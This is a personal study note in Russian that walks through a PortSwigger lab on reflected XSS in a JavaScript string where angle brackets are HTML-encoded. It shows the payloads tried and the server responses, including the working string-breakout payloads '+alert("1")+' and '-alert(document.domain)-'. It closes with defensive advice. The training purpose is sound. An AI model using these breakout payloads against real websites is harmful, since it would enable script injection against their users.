в прошлой лабе нужно было варваться из строки js 
здесь же вроде как нужно выполнить код внутри строки  js
нужно выйти из строкового литерала

## использовать математические операторы для выхода из строки  

пример:
```js
'-alert(document.domain)-' 
';alert(document.domain)//
```

лаба 
https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-html-encoded
###### Reflected XSS into a JavaScript string with angle brackets HTML encoded

задание:
в поиске есть xss
нужно вызвать аллерт

-----

пейлоад 777
респонс
```html
    <script>
   var searchTerms = '7777';
   document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
   </script>
```


``<img src=1 onerror=allert("777")>``
``
пейлоад `'<img src=1 onerror=allert("777")>'`
респонс
```html
                   <script>
                        var searchTerms = ''&lt;img src=1 onerror=allert("777")&gt;'';
                        document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
                    </script>
```

угловые скобки кодируются! а кавычки нет


`'src=1 onerror=allert("777")'`
response
```html
                   <script>
                        var searchTerms = ''src=1 onerror=allert("777")'';
                        document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
                    </script>
```

пробую не закрывать тег, а выполнить 

`'alert("1")'` пейлоад не работает!

подсмотрел решение

оказывается, можно использовать математические операторы для выхода из строки  
например через сложение:
`'+alert("1")+'`

пейлоад сработал!


---

#### выводы по лабе XSS с кодированием угловых скобок:

1. угловые скобки кодируются, поэтому вставить HTML-тег не получилось
   
2. кавычки не кодируются, значит атака возможна только через JavaScript
   
3. пейлоад 'alert("1")' не сработал потому что это просто строка внутри строки
   
4. пейлоад '+alert("1")+' сработал потому что он выходит из строки через оператор сложения
   
5. после закрытия кавычки плюс превращает строку в выражение и выполняет код
   
6. ошибка разработчика в том что они защитили HTML контекст но забыли про JavaScript
   

#### как защититься:

1. для вставки в JavaScript строку нужно использовать не просто экранирование а ==JSON.stringify== которая экранирует всё правильно включая кавычки и юникод
   
2. не доверять пользовательскому вводу и всегда кодировать данные под конкретный контекст
   
3. использовать Content Security Policy с запретом на unsafe-inline
   
4. если данные вставляются в JS лучше использовать textContent а не innerHTML


